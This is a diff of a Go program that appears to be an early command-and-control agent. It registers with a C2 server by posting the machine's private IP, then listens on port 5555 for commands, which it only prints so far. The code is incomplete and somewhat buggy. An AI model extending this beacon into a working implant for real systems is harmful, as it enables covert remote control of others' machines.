@@ -7,6 +7,7 @@ import (
 	"net/http"
 	"strconv"
 	"strings"
+	"time"
 )
 
 func findLocalAddress(ips []net.IP) []string {
@@ -29,19 +30,6 @@ func findLocalAddress(ips []net.IP) []string {
 			if octet_int == 10 {
 				LocalIps = append(LocalIps, ipStr)
 			}
-
-			// if private_net_type == 0 {
-			// 	if octet_int == 192 {
-			// 		private_net_type = 192
-			// 	} else if octet_int == 10 {
-			// 		private_net_type = 10
-			// 	}else{
-			// 		break
-			// 	}
-			// }else if private_net_type == 192{
-			// 	if octet_int == 168{
-			// 		octet_int_next,_ := strconv.Atoi(octet_array[i+1])
-			// 	}
 
 		}
 
@@ -75,33 +63,36 @@ func GetIPs() []net.IP {
 
 // port - 1234
 func main() {
-	//ip_addr := flag.String("ip", "localhost", "ip addres of c2")
+	ip_addr := flag.String("ip", "localhost", "ip addres of c2")
 	//endpoint := flag.String("endpoint", "", "endpoint c2")
 
 	flag.Parse()
 
 	//sendReadySignal(ip_addr)
-	ip := GetIPs()
-	fmt.Println(ip)
-	fmt.Println(findLocalAddress(ip))
+	go startServer()
+	sendReadySignal(ip_addr)
+	time.Sleep(100 * time.Millisecond)
 }
 func sendReadySignal(ip *string) {
 	c2_addr := "http://" + *ip + ":1234/ready"
+	local_ips := GetIPs()
+	local_IP := findLocalAddress(local_ips)[0]
+	local_IP = local_IP + ":5555"
 
-	fmt.Printf(c2_addr)
+	fmt.Printf(local_IP)
 	fmt.Printf("\n")
-
-	body := strings.NewReader(`
+	body := strings.NewReader(fmt.Sprintf(`
 	{
-		"ip":"localhost:5555"
+		"ip":"%s"
 	}
-	`)
+	`, local_IP))
+
 	resp, err := http.Post(c2_addr, "application/json", body)
 	if err != nil {
 		fmt.Printf("Error with post request")
 	}
-	defer resp.Body.Close()
-	fmt.Printf("Status: " + resp.Status)
+	resp.Body.Close()
+	fmt.Printf("Status: " + resp.Status + "\n")
 	/*
 		var jsonData = []byte(`{
 			"ip":"localhost:5555"
@@ -121,12 +112,22 @@ func sendReadySignal(ip *string) {
 			body, _ := ioutil.ReadAll(response.Body)
 			fmt.Println("response Body:", string(body))
 	*/
-	go startServer()
 
 }
+
+//Server
+
 func startServer() {
+	fmt.Printf("Server started")
 	http.HandleFunc("/cmd", func(w http.ResponseWriter, r *http.Request) {
-		fmt.Printf(r.URL.Query().Get("m"))
+		fmt.Printf("cmd endpoint \n")
+		if r.Method != http.MethodPost {
+			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+			return
+		}
+		cmd := r.URL.Query().Get("m")
+
+		fmt.Printf(cmd)
 	})
 
 	http.ListenAndServe(":5555", nil)
